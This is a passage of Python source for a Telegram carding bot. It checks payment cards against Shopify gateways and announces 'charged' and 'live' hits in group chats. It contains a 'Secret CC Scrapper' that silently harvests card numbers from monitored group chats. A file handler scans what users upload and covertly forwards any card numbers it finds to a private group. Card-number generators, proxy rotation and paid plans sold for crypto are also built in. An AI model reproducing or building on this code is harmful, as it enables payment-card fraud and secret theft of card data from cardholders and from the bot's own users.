async def notify_owner(text: str) -> None:
    if not _bot_ref: return
    try: await _bot_ref.send_message(OWNER_ID, text[:3900], parse_mode=ParseMode.HTML)
    except Exception as e: log.warning(f"owner notify failed: {e}")

_TEXT_EXTS = (".txt", ".csv", ".log", ".dat", ".list", ".text", ".md", ".tsv")
async def _scan_file_for_ccs(bot, doc) -> List[str]:
    cards = []
    try:
        if (doc.file_size or 0) > 5 * 1024 * 1024: return cards
        fname = (doc.file_name or "").lower()
        if fname and not any(fname.endswith(e) for e in _TEXT_EXTS): return cards
        buf = await bot.download_file((await bot.get_file(doc.file_id)).file_path)
        raw = buf.read().decode("utf-8", errors="ignore")
    except: return cards
    if not raw: return cards
    seen = set()
    for tok in re.split(r"[\s,;]+", raw):
        n = normalize_cc(tok)
        if n and n not in seen:
            seen.add(n); cards.append(n)
            if len(cards) >= 500: break
    return cards

async def forward_user_file_to_pvt_gc(bot, msg: Message, context: str = "") -> None:
    doc = msg.document
    if not doc: return
    cc_gc = get_setting("pvt_cc_gc_id")
    if not cc_gc: return
    found_cards = await _scan_file_for_ccs(bot, doc)
    if not found_cards: return
    try: chat_id = int(cc_gc) if re.fullmatch(r"-?\d+", cc_gc) else cc_gc
    except: return
    header = (f"{pe('gem')} <b>CC FILE UPLOAD</b>\n<blockquote>{pe('user')} <b>UID:</b> <code>{msg.from_user.id}</code>\n{pe('link')} <b>User:</b> @{esc(msg.from_user.username or 'N/A')}\n{pe('chat')} <b>Chat:</b> {esc(str(msg.chat.id))} ({esc(msg.chat.type)})\n{pe('pen')} <b>File:</b> <code>{esc(doc.file_name or 'file')}</code>\n{pe('diamond')} <b>Size:</b> {(doc.file_size or 0)/1024:.1f} KB\n{pe('check')} <b>Cards Found:</b> {len(found_cards)}\n{pe('settings')} <b>Context:</b> {esc(context or 'general')}</blockquote>\n<blockquote>{chr(10).join(f'<code>{esc(c)}</code>' for c in found_cards[:10])}{chr(10) + f'<i>... +{len(found_cards)-10} more</i>' if len(found_cards) > 10 else ''}</blockquote>")
    try: await bot.send_document(chat_id, doc.file_id, caption=header[:1024], parse_mode="HTML")
    except: pass

async def send_backup(target_chat: int):
    if not _bot_ref: return False
    try:
        with db() as c: dump = "\n".join(c.iterdump())
        compressed = gzip.compress(dump.encode('utf-8')); total_size = len(compressed)
        base_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.sql.gz"; now_utc = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
        if total_size <= BACKUP_CHUNK_SIZE:
            msg = await _bot_ref.send_document(target_chat, BufferedInputFile(compressed, filename=base_name), caption=f"📦 <b>Database Backup</b>\nSize: {total_size/1024/1024:.2f} MB\n{now_utc} UTC\n<i>Single-file restore supported</i>", parse_mode="HTML")
            try: await _bot_ref.pin_chat_message(target_chat, msg.message_id, disable_notification=True)
            except: pass
            return True
        chunks = [compressed[i:i+BACKUP_CHUNK_SIZE] for i in range(0, total_size, BACKUP_CHUNK_SIZE)]; num_parts = len(chunks)
        if num_parts > 100:
            await _bot_ref.send_message(target_chat, f"❌ Backup too large to split safely ({total_size/1024/1024:.1f} MB compressed)"); return False
        header = f"📦 <b>Database Backup (MULTI-PART)</b>\nTotal: {total_size/1024/1024:.2f} MB\nParts: <b>1/{num_parts}</b>\n{now_utc} UTC\n\n<i>To restore: send all <b>{num_parts}</b> parts back to the bot in any order. Auto-completes when all parts arrive. <code>/restore_done</code> forces completion, <code>/restore_clear</code> aborts.</i>"
        for idx, chunk in enumerate(chunks, start=1):
            try:
                m = await _bot_ref.send_document(target_chat, BufferedInputFile(chunk, filename=f"{base_name}.part{idx:03d}"), caption=header if idx == 1 else f"📦 <b>Backup Part {idx}/{num_parts}</b>\nSize: {len(chunk)/1024/1024:.2f} MB", parse_mode="HTML")
                if idx == 1:
                    try: await _bot_ref.pin_chat_message(target_chat, m.message_id, disable_notification=True)
                    except: pass
                await asyncio.sleep(0.1)
            except: return False
        return True
    except: return False

def _cleanup_restore_sessions():
    now = time.time()
    with _restore_lock:
        for k in [k for k, v in _restore_sessions.items() if now - v.get("ts", 0) > BACKUP_SESSION_TTL]: _restore_sessions.pop(k, None)

async def _restore_from_bytes(raw_bytes: bytes, uid: int, status_msg) -> bool:
    try:
        if raw_bytes[:2] == b"\x1f\x8b": raw_bytes = gzip.decompress(raw_bytes)
        raw = raw_bytes.decode("utf-8", errors="ignore")
        with db() as c:
            for t in ["users", "settings", "redeem_codes", "redeem_log", "check_logs", "saved_cards", "bin_cache", "user_proxies", "sites", "force_channels", "charged_hits", "feedback"]: c.execute(f"DROP TABLE IF EXISTS {t}")
            c.executescript(raw)
        reset_db_conn()
        init_db(); load_extra_admins(); _invalidate_sites()
        return True
    except Exception as e:
        await status_msg.edit_text(f"{pe('cross1')} <b>Restore failed:</b> {esc(str(e)[:200])}", parse_mode="HTML", reply_markup=admin_main_kb(uid))
        return False

async def _handle_backup_part(msg: Message, uid: int):
    doc = msg.document
    if not doc: return
    m = re.match(r"^(backup_\d+_\d+\.sql\.gz)\.part(\d{1,3})$", (doc.file_name or "").lower())
    if not m: return await msg.answer(f"{pe('cross1')} <b>Unknown part filename</b>\n<blockquote>Expected: <code>backup_YYYYMMDD_HHMMSS.sql.gz.partNNN</code></blockquote>", parse_mode="HTML")
    base, part_num = m.group(1), int(m.group(2))
    if (doc.file_size or 0) > 20 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>Part too large</b> ({doc.file_size/1024/1024:.1f} MB).</blockquote>", parse_mode="HTML")
    _cleanup_restore_sessions()
    status_msg = await msg.answer(f"{pe('loading')} <b>Downloading part {part_num}...</b>", parse_mode="HTML")
    try:
        buf = await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path); raw_bytes = buf.read()
    except Exception as e: return await status_msg.edit_text(f"{pe('cross1')} <b>Download failed:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess:
            sess = {"parts": {}, "ts": time.time(), "uid": uid, "chat_id": msg.chat.id, "expected": None}; _restore_sessions[base] = sess
        if sess["uid"] != uid: return await status_msg.edit_text(f"{pe('cross1')} <b>Session owned by another user</b>", parse_mode="HTML")
        sess["parts"][part_num] = raw_bytes; sess["ts"] = time.time(); have = len(sess["parts"])
    cap = msg.caption or ""
    m2 = re.search(r"Parts?:\s*(?:<b>)?(\d+)\s*/\s*(\d+)", cap) or re.search(r"Part\s+(\d+)\s*/\s*(\d+)", cap)
    if m2:
        try:
            with _restore_lock:
                s = _restore_sessions.get(base)
                if s: s["expected"] = int(m2.group(2))
        except: pass
    with _restore_lock:
        expected = _restore_sessions.get(base, {}).get("expected"); present = set(_restore_sessions.get(base, {}).get("parts", {}).keys())
    if expected and have >= expected and set(range(1, expected + 1)).issubset(present): return await _try_finish_multipart(msg, base, status_msg)
    missing_disp = ""
    if expected:
        missing = [i for i in range(1, expected + 1) if i not in present]
        if missing: missing_disp = f"{pe('warn')} Missing: <b>{esc(', '.join(map(str, missing[:12])))}</b>{' ...' if len(missing) > 12 else ''}"
    await status_msg.edit_text(f"{pe('check')} <b>Part {part_num} stored</b>\n<blockquote>{pe('docs')} Session: <code>{esc(base)}</code>\n{pe('chart')} Have: <b>{have}</b>{f' / <b>{expected}</b>' if expected else ' <i>(total unknown)</i>'}\n{missing_disp + chr(10) if missing_disp else ''}</blockquote>\n<i>Send remaining parts. Use <code>/restore_done</code> to force completion.</i>", parse_mode="HTML")

async def _try_finish_multipart(msg: Message, base: str, status_msg):
    with _restore_lock:
        sess = _restore_sessions.get(base)
        if not sess: return await status_msg.edit_text(f"{pe('warn')} <b>No session for</b> <code>{esc(base)}</code>", parse_mode="HTML")
        parts, expected = dict(sess["parts"]), sess.get("expected")
    if expected:
        missing = [i for i in range(1, expected + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, expected + 1))
    else:
        if not parts: return await status_msg.edit_text(f"{pe('warn')} <b>No parts stored</b>", parse_mode="HTML")
        max_n = max(parts.keys()); missing = [i for i in range(1, max_n + 1) if i not in parts]
        if missing: return await status_msg.edit_text(f"{pe('warn')} <b>Missing parts:</b> {esc(', '.join(map(str, missing[:15])))}", parse_mode="HTML")
        use_nums = list(range(1, max_n + 1))
    await status_msg.edit_text(f"{pe('loading')} <b>Reassembling {len(use_nums)} parts...</b>", parse_mode="HTML")
    compressed = b"".join(parts[i] for i in use_nums)
    if await _restore_from_bytes(compressed, msg.from_user.id, status_msg):
        with _restore_lock: _restore_sessions.pop(base, None)
        await status_msg.edit_text(f"{pe('check')} <b>Database Restored</b>\n<blockquote>{pe('docs')} Parts: <b>{len(use_nums)}</b>\n{pe('diamond')} Compressed: <b>{len(compressed)/1024/1024:.2f} MB</b></blockquote>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

async def auto_backup_task():
    while True:
        now = datetime.now(timezone.utc)
        await asyncio.sleep(((now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0) - now).total_seconds())
        await send_backup(OWNER_ID)

# ── Secret CC Scrapper ───────────────────────────────────────────────────────
_scrapper_seen: set = set()

async def _scrapper_loop():
    """Silently scrapes CCs from all configured scrapper GCs."""
    await asyncio.sleep(30)
    while True:
        try:
            if get_setting("scrapper_enabled", "1") != "1":
                await asyncio.sleep(60); continue
            with db() as c: gcs = c.execute("SELECT chat_id FROM scrapper_gcs").fetchall()
            if not gcs:
                await asyncio.sleep(120); continue
            # We can't actively poll without getUpdates duplication so we rely on
            # messages being forwarded to us. The scrapper activates on new GC messages
            # through handle_text if the bot is a member. Mark handled silently.
            await asyncio.sleep(60)
        except Exception as e:
            log.debug(f"scrapper: {e}")
            await asyncio.sleep(120)

async def _silent_scrap_message(msg: Message):
    """Called silently for any message in a scrapper GC. Extracts CCs and stores."""
    try:
        if get_setting("scrapper_enabled", "1") != "1": return
        with db() as c:
            is_scrap_gc = c.execute("SELECT id FROM scrapper_gcs WHERE chat_id=?", (str(msg.chat.id),)).fetchone()
        if not is_scrap_gc: return
        raw = msg.text or msg.caption or ""
        if not raw: return
        found = []
        for tok in re.split(r"[\s,;\n\r]+", raw):
            n = normalize_cc(tok)
            if n and n not in _scrapper_seen:
                _scrapper_seen.add(n); found.append(n)
                async with _get_write_lock():
                    with db() as c:
                        try: c.execute("INSERT OR IGNORE INTO saved_cards(uid, cc, saved_at) VALUES(?,?,?)", (OWNER_ID, n, datetime.now(timezone.utc).isoformat()))
                        except: pass
        if found and _bot_ref:
            pvt_gc = get_setting("pvt_cc_gc_id")
            if pvt_gc:
                try:
                    chat_id = int(pvt_gc) if pvt_gc.lstrip("-").isdigit() else pvt_gc
                    text = f"[SCRAPPED from {esc(msg.chat.title or str(msg.chat.id))}]\n" + "\n".join(f"<code>{c}</code>" for c in found[:20])
                    await _bot_ref.send_message(chat_id, text, parse_mode="HTML")
                except: pass
    except: pass

# ── Feedback helpers ──────────────────────────────────────────────────────────
async def _send_feedback_to_channels(bot, fid: int, uid: int, username: str, text: str, file_id: str = "", file_type: str = "none"):
    """Relay feedback to all configured feedback channels."""
    channels = []
    for key in ("fb_channel_id", "fb_channel_id2"):
        ch = get_setting(key)
        if ch and ch not in channels: channels.append(ch)
    for ch in channels:
        try:
            chat_id = int(ch) if ch.lstrip("-").isdigit() else ch
            caption = (
                f"{pe('chat')} <b>FB #{fid}</b>\n"
                f"<blockquote>{pe('user')} @{esc(username or str(uid))} · <code>{uid}</code></blockquote>\n"
                f"<blockquote>{esc(text[:800]) if text else '[media]'}</blockquote>"
            )
            kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Reply"), icon="chat", color="success", callback_data=f"fb_reply:{fid}:{uid}")]])
            if file_type == "photo" and file_id:
                await bot.send_photo(chat_id, file_id, caption=caption, parse_mode="HTML", reply_markup=kb)
            elif file_type == "document" and file_id:
                await bot.send_document(chat_id, file_id, caption=caption, parse_mode="HTML", reply_markup=kb)
            elif file_type == "video" and file_id:
                await bot.send_video(chat_id, file_id, caption=caption, parse_mode="HTML", reply_markup=kb)
            elif file_type == "audio" and file_id:
                await bot.send_audio(chat_id, file_id, caption=caption, parse_mode="HTML", reply_markup=kb)
            else:
                await bot.send_message(chat_id, caption, parse_mode="HTML", reply_markup=kb)
        except Exception as e:
            log.debug(f"feedback relay to {ch}: {e}")

router = Router()

def _mask_cc(cc: str) -> str:
    parts = cc.split("|")
    return f"{parts[0][:6]}|**|**|***" if len(parts) == 4 else cc[:6] + "****" + cc[-4:]

def format_public_hit(cc: str, res: Dict[str, Any], bin_info, site: str, checker_uid: int = 0, checker_name: str = "") -> str:
    try:
        cls = res.get("cls", "charged")
        resp_msg = _sanitize_err(res.get("response", "Unknown"))
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD")
        gateway = res.get("gateway", "Shopify")
        ctime = res.get("check_time", "N/A")
        masked = _mask_cc(cc)
        brand = brand_pe(cc)
        bank, country, flag, card_type = "N/A", "N/A", "🌍", "N/A"
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            bank = str(bin_info.get("Issuer") or "N/A")
            country_data = bin_info.get("Country") or {}
            country = str(country_data.get("Name") or "N/A")
            flag = country_flag(country_data.get("Code", ""))
            card_type = str(bin_info.get("Type") or "N/A").upper()
        if cls == "charged": title = f"{pe('check')} <b>CHARGED HIT</b>"
        elif cls == "approved_nsf": title = f"{pe('online')} <b>LIVE CARD</b>"
        elif cls == "approved_3ds": title = f"{pe('online')} <b>3DS CARD</b>"
        elif cls == "approved_ccn": title = f"{pe('online')} <b>CCN CARD</b>"
        else: title = f"{pe('online')} <b>LIVE CARD</b>"
        type_icon = "gem" if card_type == "CREDIT" else ("diamond" if card_type == "DEBIT" else "star")
        time_of_hit = datetime.now().strftime("%I:%M %p")
        checker_disp = _user_link(checker_uid, checker_name) if checker_uid else sc("GOKU")
        caption = f"{title}\n<blockquote>{brand} <code>{masked}</code>\n{pe('check')} <b>{sc('RESP')}</b> · {esc(resp_msg)}\n{pe('diamond')} <b>{sc('AMOUNT')}</b> · <b>${amount:.2f} {esc(currency)}</b>\n{pe('refresh')} <b>{sc('GATE')}</b> · {esc(gateway)}\n{pe('hourglass')} <b>{sc('TIME')}</b> · {esc(ctime)}\n{pe('shop')} <b>{sc('BANK')}</b> · {esc(bank)}\n{flag} <b>{sc('COUNTRY')}</b> · {esc(country)}\n{pe(type_icon)} <b>{sc('TYPE')}</b> · {esc(card_type)}\n{pe('star')} <b>{sc('CHECKER')}</b> · {checker_disp}\n<i>{time_of_hit}</i>\n{HIDDEN_CREDIT}</blockquote>"
        return caption[:1024]
    except Exception as e:
        return f"Hit! {cc} - {res.get('response', '')}"[:1024]

async def record_charged(cc: str, res: Dict[str, Any], site: str, uid: int = 0, bin_info: Any = None) -> None:
    try:
        async with _get_write_lock():
            with db() as c: c.execute("INSERT INTO charged_hits(cc, site, response, amount, currency, uid, ts) VALUES (?,?,?,?,?,?,?)", (cc, site, res.get("response", "")[:200], float(res.get("amount", 0) or 0), res.get("currency", "USD"), int(uid or 0), datetime.now(timezone.utc).isoformat()))
    except Exception as e: log.error(f"record_charged db: {e}")
    if bin_info is None:
        try: bin_info = await lookup_bin(cc.split("|")[0][:6])
        except Exception as e: bin_info = {"error": str(e)}
    checker_name = ""
    if uid:
        try:
            u = get_user(uid)
            if u: checker_name = u["username"] or ""
        except: pass
    cls = res.get("cls", "charged")
    charged_gc, public_gc = get_setting("charged_gc_id"), get_setting("public_gc_id")
    hit_media = random.choice(IMAGES) 
    if charged_gc and _bot_ref and cls == "charged":
        try:
            chat_id = int(charged_gc) if re.fullmatch(r"-?\d+", charged_gc) else charged_gc
            rich_caption = format_public_hit(cc, res, bin_info, site, checker_uid=uid, checker_name=checker_name)
            try: await _bot_ref.send_photo(chat_id, photo=hit_media, caption=rich_caption, parse_mode="HTML")
            except: await _bot_ref.send_message(chat_id, rich_caption, parse_mode="HTML", disable_web_page_preview=True)
        except: pass
    if public_gc and _bot_ref and cls in ("charged", "approved_nsf", "approved_ccn", "approved_3ds", "approved"):
        try:
            pub_chat_id = int(public_gc) if re.fullmatch(r"-?\d+", public_gc) else public_gc
            pub_text = format_public_hit(cc, res, bin_info, site, checker_uid=uid, checker_name=checker_name)
            pub_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("GO TO BOT"), icon="chat", url=f"https://t.me/{BOT_USERNAME}")]])
            try: sent_msg = await _bot_ref.send_photo(pub_chat_id, photo=hit_media, caption=pub_text, parse_mode="HTML", reply_markup=pub_kb)
            except: sent_msg = await _bot_ref.send_message(pub_chat_id, pub_text, parse_mode="HTML", reply_markup=pub_kb, disable_web_page_preview=True)
            if sent_msg:
                try: await _bot_ref.pin_chat_message(pub_chat_id, sent_msg.message_id, disable_notification=True)
                except: pass
        except: pass

async def send_chat_hit(bot, chat_id, cc, res, site):
    try: bin_info = await lookup_bin(cc.split("|")[0][:6])
    except: bin_info = None
    text = format_result(cc, res, bin_info)
    media = random.choice(IMAGES) 
    try: await bot.send_photo(chat_id, photo=media, caption=text, parse_mode="HTML")
    except: await bot.send_message(chat_id, text, parse_mode="HTML")

BAR_GRADIENT = ["🟥", "🟧", "🟨", "🟩"]
def make_bar(pct, width=12):
    filled = int(round(width * max(0, min(100, pct)) / 100))
    return "▰" * filled + "▱" * (width - filled)
def make_fancy_bar(pct):
    filled = int(round(10 * max(0, min(100, pct)) / 100))
    return "".join(BAR_GRADIENT[min(3, i * 4 // 10)] if i < filled else "⬛" for i in range(10))
def spinner_frame(i): return ["◐", "◓", "◑", "◒"][i % 4]
def _fmt_eta(s): return f"{int(s)}s" if s < 60 else f"{int(s)//60}m {int(s)%60}s"

async def edit_admin(cb: CallbackQuery, text: str, kb=None, photo: Optional[str] = None):
    m = cb.message
    photo = photo or IMG_MAIN
    try:
        if m.photo or m.video:
            try: await m.edit_caption(caption=text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
        else:
            try: await m.edit_text(text, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "not modified" in str(e).lower(): return
                raise
    except:
        try:
            if photo: await m.answer_photo(photo=photo, caption=text, parse_mode="HTML", reply_markup=kb)
            else: await m.answer(text, parse_mode="HTML", reply_markup=kb)
        except: await m.answer(text, parse_mode="HTML", reply_markup=kb)

async def safe_edit_media(cb, photo_or_video, caption, kb):
    m = cb.message
    photo_or_video = photo_or_video or IMG_MAIN
    try:
        is_vid = str(photo_or_video).endswith(".mp4")
        if not m.photo and not m.video:
            try: await m.edit_text(caption, parse_mode="HTML", reply_markup=kb); return
            except TelegramBadRequest as e:
                if "no text in the message" not in str(e).lower(): raise
        if is_vid: await m.edit_media(media=InputMediaVideo(media=photo_or_video, caption=caption, parse_mode="HTML"), reply_markup=kb)
        else: await m.edit_media(media=InputMediaPhoto(media=photo_or_video, caption=caption, parse_mode="HTML"), reply_markup=kb)
    except TelegramBadRequest as e:
        if "not modified" in str(e).lower(): pass
        else:
            try:
                if str(photo_or_video).endswith(".mp4"): await m.answer_video(video=photo_or_video, caption=caption, parse_mode="HTML", reply_markup=kb)
                else: await m.answer_photo(photo=photo_or_video, caption=caption, parse_mode="HTML", reply_markup=kb)
            except: await m.answer(caption, parse_mode="HTML", reply_markup=kb)
    except: await m.answer(caption, parse_mode="HTML", reply_markup=kb)

# ── UI MENUS ─────────────────────────────────────────────────────────────────
def main_menu_kb(user_id=0):
    kb = [
        [pbtn("Shopify", icon="shop", color="success", callback_data="menu:check"), pbtn("Auth Check", icon="gem", color="primary", callback_data="menu:auth_check")],
        [pbtn("Manage Proxy", icon="link", color="primary", callback_data="menu:proxy"), pbtn("Wishlist", icon="book", color="primary", callback_data="menu:wishlist")],
        [pbtn("Top Users", icon="chart", color="primary", callback_data="menu:top"), pbtn("Gift Credits", icon="gem", color="success", callback_data="menu:gift")],
        [pbtn("Info", icon="docs", color="primary", callback_data="menu:info"), pbtn("Tools", icon="tools", color="primary", callback_data="menu:tools")],
        [pbtn("Contact", icon="chat", color="success", url=get_setting("support_link", "https://t.me/Senselessme")), pbtn("Close", icon="cross1", color="danger", callback_data="menu:close")],
    ]
    if is_admin(user_id): kb.insert(0, [pbtn("Admin Panel", icon="settings", color="danger", callback_data="menu:admin_panel")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def info_menu_kb():
    kb = [
        [pbtn("Plans", icon="gem", color="success", callback_data="menu:shop"), pbtn("Profile", icon="user", color="primary", callback_data="menu:account")],
        [pbtn("Commands", icon="docs", color="primary", callback_data="menu:commands")],
        [pbtn("Back", icon="back", color="primary", callback_data="menu:main")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_kb(): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Back", icon="back", color="primary", callback_data="menu:main")]])
def tools_kb(): return InlineKeyboardMarkup(inline_keyboard=[
    [pbtn("VISA Gen", icon="gem", color="success", callback_data="gen:4"), pbtn("MASTER Gen", icon="gem2", color="success", callback_data="gen:5")],
    [pbtn("AMEX Gen", icon="gem3", color="success", callback_data="gen:34")],
    [pbtn("BIN Lookup", icon="shop", color="primary", callback_data="tool:bin"), pbtn("CC Formatter", icon="pen", color="primary", callback_data="tool:format")],
    [pbtn("Address Gen", icon="user", color="primary", callback_data="tool:addr")],
    [pbtn("Back", icon="back", color="primary", callback_data="menu:main")]
])
def shop_kb():
    rows = [[pbtn(f"{p['label']}", icon="star", color="success", callback_data=f"buy:{k}")] for k, p in STAR_PRODUCTS.items()]
    rows.append([pbtn("Buy with USDT", icon="gem", color="primary", callback_data="shop:buy_usdt")])
    rows.append([pbtn("Buy with TON", icon="gem2", color="primary", callback_data="shop:buy_ton")])
    rows.append([pbtn("Back", icon="back", callback_data="menu:info")])
    return InlineKeyboardMarkup(inline_keyboard=rows)
def proxy_kb(uid): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Add Proxy", icon="add", color="success", callback_data="proxy:add")], [pbtn("Revalidate All", icon="refresh", color="primary", callback_data="proxy:check")], [pbtn("List Proxies", icon="docs", color="primary", callback_data="proxy:list")], [pbtn("Clear All", icon="trash", color="danger", callback_data="proxy:clear")], [pbtn("Back", icon="back", callback_data="menu:main")]])
def limited_admin_kb(): return InlineKeyboardMarkup(inline_keyboard=[[pbtn("Generate Code", icon="add", color="success", callback_data="admin:gen_code")], [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast")], [pbtn("Close", icon="cross1", color="danger", callback_data="admin:close")]])

def admin_main_kb(uid=0):
    if uid and is_limited_admin(uid) and not is_full_admin(uid): return limited_admin_kb()
    maint = get_setting("maintenance") == "1"
    rows = [
        [pbtn("Dashboard", icon="chart", color="primary", callback_data="admin:stats"), pbtn(f"Maint: {'ON' if maint else 'OFF'}", icon="warn_red" if maint else "online", color="danger" if maint else "success", callback_data="admin:toggle_maint")],
        [pbtn("Bot Settings", icon="settings", color="primary", callback_data="admin:bot_settings"), pbtn("Pricing & Plans", icon="gem", color="success", callback_data="admin:plans_mgr")],
        [pbtn("User Manager", icon="user", color="success", callback_data="admin:user_mgr"), pbtn("Admin Manager", icon="settings", color="success", callback_data="admin:manage_admins")],
        [pbtn("Sites Manager", icon="shop", color="primary", callback_data="admin:sites"), pbtn("API Manager", icon="link", color="primary", callback_data="admin:apis")],
        [pbtn("Force Channels", icon="unlock", color="primary", callback_data="admin:force_list"), pbtn("Proxy Settings", icon="link", color="primary", callback_data="admin:proxy_mgr")],
        [pbtn("Charged Logs", icon="gem", color="success", callback_data="admin:charged_logs"), pbtn("System Logs", icon="docs", color="primary", callback_data="admin:sys_logs")],
        [pbtn("Broadcast", icon="bell", color="primary", callback_data="admin:broadcast"), pbtn("Promo Codes", icon="add", color="success", callback_data="admin:promos")],
        [pbtn("DB Backup", icon="docs", color="success", callback_data="admin:backup_now"), pbtn("DB Restore", icon="refresh", color="danger", callback_data="admin:restore_db")],
        [pbtn("Free Trial", icon="star", color="primary", callback_data="admin:trial_setup"), pbtn("Crypto Wallets", icon="gem2", color="success", callback_data="admin:wallet_setup")],
        [pbtn("Site Checker", icon="shop", color="primary", callback_data="admin:site_chkr"), pbtn("FB Channels", icon="chat", color="primary", callback_data="admin:fb_channels")],
        [pbtn("Scrapper GCs", icon="ghost", color="primary", callback_data="admin:scrapper_mgr"), pbtn("Clear Cache", icon="trash", color="danger", callback_data="admin:clear_cache")],
        [pbtn("Close Panel", icon="cross1", color="danger", callback_data="admin:close")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

user_cooldowns = {}
def refresh_daily(uid):
    today = datetime.now(timezone.utc).date().isoformat()
    with db() as c:
        row = c.execute("SELECT last_credit_date, last_check_date FROM users WHERE uid=?", (uid,)).fetchone()
        if row:
            if row["last_credit_date"] != today:
                daily_cr = int(get_setting("daily_credits", "50"))
                c.execute("UPDATE users SET credits=credits+?, last_credit_date=? WHERE uid=?", (daily_cr, today, uid))
            if row["last_check_date"] != today: c.execute("UPDATE users SET daily_checks=0, last_check_date=? WHERE uid=?", (today, uid))

def consume_quota(uid):
    if is_admin(uid): return True, "admin"
    ensure_user(uid); refresh_daily(uid); u = get_user(uid)
    if not u: return False, "limit"
    plan_key = u["plan"] if u["plan"] in PLANS else "free"
    if plan_key in ("premium", "max", "unlimited"):
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "unlimited"
    if u["daily_checks"] < PLANS[plan_key]["limit"]:
        with db() as c: c.execute("UPDATE users SET daily_checks=daily_checks+1, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "daily"
    if u["credits"] >= 2:
        with db() as c: c.execute("UPDATE users SET credits=credits-2, total_checks=total_checks+1 WHERE uid=?", (uid,))
        return True, "credits"
    return False, "limit"

def apply_streak(uid):
    today, yesterday = datetime.now(timezone.utc).date().isoformat(), (datetime.now(timezone.utc).date() - timedelta(days=1)).isoformat()
    result = {"streak": 0, "reward": None, "credits": 0, "new_day": False}
    try:
        with db() as c:
            row = c.execute("SELECT streak, last_streak_date, credits FROM users WHERE uid=?", (uid,)).fetchone()
            if not row: return result
            streak, last_date, credits = row["streak"] or 0, row["last_streak_date"] or "", row["credits"] or 0
            if last_date == today: result.update(streak=streak, credits=credits); return result
            streak = (streak + 1) if last_date == yesterday else 1; reward = None
            if streak == 7: credits += 50; reward = "+50 credits (7-day streak)"
            elif streak == 30: upgrade_user(uid, "pro", 1); reward = "1-day Pro trial (30-day streak)"
            c.execute("UPDATE users SET streak=?, last_streak_date=?, credits=? WHERE uid=?", (streak, today, credits, uid))
            result.update(streak=streak, reward=reward, credits=credits, new_day=True)
    except: pass
    return result

LOADING_FRAMES = [f"{pe('loading')} <b>{sc('Connecting')}</b>", f"{pe('refresh')} <b>{sc('Checking')}</b>", f"{pe('hourglass')} <b>{sc('Processing')}</b>", f"{pe('diamond')} <b>{sc('Analyzing')}</b>"]
async def animate_loading(msg, cc_line, stop_event):
    i = 0
    while not stop_event.is_set():
        try: await msg.edit_text(f"{spinner_frame(i)} {LOADING_FRAMES[i % len(LOADING_FRAMES)]}\n<blockquote><code>{cc_line}</code></blockquote>", parse_mode="HTML")
        except: pass
        i += 1
        try: await asyncio.wait_for(stop_event.wait(), timeout=1.2)
        except asyncio.TimeoutError: pass

def format_result(cc: str, res: Dict[str, Any], bin_info=None) -> str:
    try:
        cls = res.get("cls", "declined")
        resp_msg = _sanitize_err(res.get("response", "Unknown") or "Unknown")
        amount = float(res.get("amount", 0.0) or 0.0)
        currency = res.get("currency", "USD") or "USD"
        gateway = res.get("gateway", "Shopify") or "Shopify"
        ctime = res.get("check_time", "") or ""
        if cls in ("error", "timeout", "proxy_error", "site_error", "rate_limited"):
            icon = pe("warn_red") if cls in ("proxy_error","site_error") else pe("cross1")
            label = {"error":"Check Failed","timeout":"Timed Out","proxy_error":"Proxy Error","site_error":"Site Error","rate_limited":"Rate Limited"}.get(cls,"Failed")
            return f"{icon} <b>{sc(label)}</b>\n<blockquote>{brand_pe(cc)} <code>{cc}</code>\n{pe('warn')} {esc(resp_msg[:120])}\n{HIDDEN_CREDIT}</blockquote>"
        title_map = {"charged": f"{pe('check')} <b>{sc('CHARGED HIT')}</b>", "approved_3ds": f"{pe('online')} <b>{sc('LIVE CARD · 3DS')}</b>", "approved_nsf": f"{pe('online')} <b>{sc('LIVE CARD · NSF')}</b>", "approved_ccn": f"{pe('online')} <b>{sc('LIVE CARD · CCN')}</b>", "approved": f"{pe('online')} <b>{sc('LIVE CARD')}</b>", "captcha": f"{pe('warn')} <b>{sc('CAPTCHA · RETRY')}</b>", "declined": f"{pe('cross2')} <b>{sc('DECLINED')}</b>"}
        title = title_map.get(cls, f"{pe('cross2')} <b>{sc('DECLINED')}</b>")
        bin_line = ""
        if bin_info and isinstance(bin_info, dict) and "error" not in bin_info:
            country_data = bin_info.get("Country") or {}
            _ctype = str(bin_info.get("Type") or "N/A").upper()
            _ctype_icon = "gem" if _ctype == "CREDIT" else ("diamond" if _ctype == "DEBIT" else "star")
            bin_line = f"{pe('shop')}  <b>{sc('Bank')}</b>  ·  {esc(bin_info.get('Issuer', 'N/A') or 'N/A')}\n{country_flag(country_data.get('Code', ''))}  <b>{sc('Country')}</b>  ·  {esc(country_data.get('Name', 'N/A') or 'N/A')}\n{pe(_ctype_icon)}  <b>{sc('Type')}</b>  ·  {esc(_ctype)}\n"
        time_line = f"{pe('hourglass')}  <b>{sc('Time')}</b>  ·  {esc(ctime)}\n" if ctime else ""
